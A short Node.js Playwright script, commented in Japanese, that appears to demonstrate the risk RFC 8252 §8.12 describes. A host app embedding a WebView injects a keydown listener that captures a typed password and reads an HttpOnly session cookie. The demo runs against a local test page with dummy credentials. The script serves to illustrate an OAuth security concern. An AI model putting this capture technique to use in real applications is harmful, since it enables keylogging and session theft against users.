// 実験2: 埋め込み型(WebView)ではホストアプリが
// 入力キーとセッションCookieを盗める、を実演
// RFC 8252 §8.12 の懸念そのもの
const { chromium } = require('playwright-core');
const URL = 'http://127.0.0.1:8863/';
const EXE = '/opt/pw-browsers/chromium';

(async () => {
  const ctx = await chromium.launchPersistentContext('./spyprof', {
    executablePath: EXE, args: ['--no-sandbox'],
  });
  const page = await ctx.newPage();

  // ホストアプリの立場: ページに盗聴コードを仕込む
  const keys = [];
  await page.exposeFunction('leak', k => keys.push(k));
  await page.addInitScript(() => {
    document.addEventListener('keydown', e => window.leak(e.key));
  });

  await page.goto(URL);
  // ユーザーがパスワードを打つ様子
  await page.click('#u');
  await page.keyboard.type('alice');
  await page.click('#p');
  await page.keyboard.type('hunter2');
  await Promise.all([page.waitForNavigation(), page.click('#go')]);

  // ホストアプリはCookieも読める(HttpOnlyでも)
  const cookies = await ctx.cookies(URL);
  const sid = cookies.find(c => c.name === 'sid');

  console.log('盗んだ入力キー:');
  console.log('  ' + keys.join(''));
  console.log('盗んだCookie(HttpOnly):');
  console.log('  sid=' + (sid ? sid.value : '(取得失敗)') +
              ' httpOnly=' + (sid ? sid.httpOnly : '?'));
  await ctx.close();
})();
